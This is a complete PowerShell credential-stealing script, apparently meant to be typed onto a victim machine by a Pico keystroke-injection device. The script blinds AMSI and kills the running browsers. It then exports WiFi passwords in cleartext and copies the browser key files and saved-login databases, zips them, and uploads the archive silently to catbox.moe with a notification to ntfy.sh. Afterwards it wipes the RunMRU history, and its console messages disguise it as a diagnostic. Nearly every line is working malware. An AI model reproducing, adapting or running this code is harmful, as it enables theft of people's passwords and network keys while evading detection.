# ──────────────────────────────────────────────────────────────
# CONFIGURATION
# ──────────────────────────────────────────────────────────────
$topic       = "data_stwealer_hide_een_"
$zipPassword = "fuckthesociety123!" # This stays hidden from logs now

$sevenZipPaths = @(
    "$env:ProgramFiles\7-Zip\7z.exe",
    "${env:ProgramFiles(x86)}\7-Zip\7z.exe",
    "C:\7-Zip\7z.exe"
)

# --- AMSI BLINDER ---
try {
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
} catch {}

function Write-Log {
    param([string]$msg)
    Write-Host "$msg" # Only prints to the local console for you to see
}

# ──────────────────────────────────────────────────────────────
# START & PREP
# ──────────────────────────────────────────────────────────────
Write-Log "Initializing Diagnostic..."

# Kill browsers to unlock files
$pList = @("chrome","msedge","brave","opera")
foreach ($p in $pList) { Stop-Process -Name $p -Force -EA SilentlyContinue }
Start-Sleep -Seconds 2

# Workspace
$dir = "$env:TEMP\ProcCache_$(Get-Random)"
$zip = "$env:TEMP\Report_$(Get-Random).zip"
New-Item -ItemType Directory $dir -Force | Out-Null

# ──────────────────────────────────────────────────────────────
# DATA COLLECTION (WiFi & Browsers)
# ──────────────────────────────────────────────────────────────
netsh wlan export profile folder=$dir key=clear | Out-Null

$browsers = @{
    "CH" = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    "ED" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    "BR" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    "OP" = "$env:APPDATA\Opera Software\Opera Stable"
}

foreach ($name in $browsers.Keys) {
    $basePath = $browsers[$name]
    $localState = Join-Path $basePath "Local State"
    if (Test-Path $localState) {
        try {
            # Copy keys and DBs into the folder
            Copy-Item $localState -Destination "$dir\$($name)_m.json" -Force
            $profile = if ($name -eq "OP") { $basePath } else { Join-Path $basePath "Default" }
            $db = Join-Path $profile "Login Data"
            if (Test-Path $db) { Copy-Item $db -Destination "$dir\$($name)_d.db" -Force }
        } catch {}
    }
}

# ──────────────────────────────────────────────────────────────
# BATCH ENCRYPTION (Zips EVERYTHING in $dir at once)
# ──────────────────────────────────────────────────────────────
Write-Log "Packaging artifacts..."

$sevenZip = $null
foreach ($path in $sevenZipPaths) { if (Test-Path $path) { $sevenZip = $path; break } }

if ($sevenZip) {
    # The 'a' command with '$dir\*' grabs every file in the folder at once
    # '-p' is used without a space to pass the password silently
    & $sevenZip a -tzip -mx=5 "-p$zipPassword" "-mem=AES256" "$zip" "$dir\*" | Out-Null
} else {
    # Fallback if 7-Zip is missing (standard zip, no password)
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::CreateFromDirectory($dir, $zip)
}

# ──────────────────────────────────────────────────────────────
# SILENT UPLOAD
# ──────────────────────────────────────────────────────────────
if (Test-Path $zip) {
    $uploadResult = curl.exe -s -F "reqtype=fileupload" -F "fileToUpload=@$zip" https://catbox.moe/user/api.php
    
    if ($uploadResult -match '^https?://files\.catbox\.moe/') {
        # Notice: We do NOT include the password in the ntfy message
        Invoke-RestMethod -Uri "https://ntfy.sh/$topic" -Method Post -Body "Status: Success | Link: $uploadResult" -EA SilentlyContinue
    }
}

# ──────────────────────────────────────────────────────────────
# CLEANUP
# ──────────────────────────────────────────────────────────────
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -EA SilentlyContinue
Remove-Item -Recurse -Force $dir, $zip -EA SilentlyContinue

Write-Log "Sync Complete."
# No exit - Pico types it.
